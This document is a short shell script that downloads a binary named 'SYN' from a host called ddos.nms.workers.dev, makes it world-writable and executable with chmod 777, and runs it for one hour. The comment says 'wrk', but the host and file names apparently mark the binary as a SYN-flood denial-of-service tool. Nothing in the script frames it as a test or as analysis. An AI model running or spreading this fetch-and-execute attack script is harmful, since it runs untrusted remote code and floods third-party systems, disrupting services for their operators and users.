#!/bin/sh

#Download wrk
curl -O https://ddos.nms.workers.dev/SYN

#Chmod
chmod 777 SYN

#running
timeout 1h ./SYN
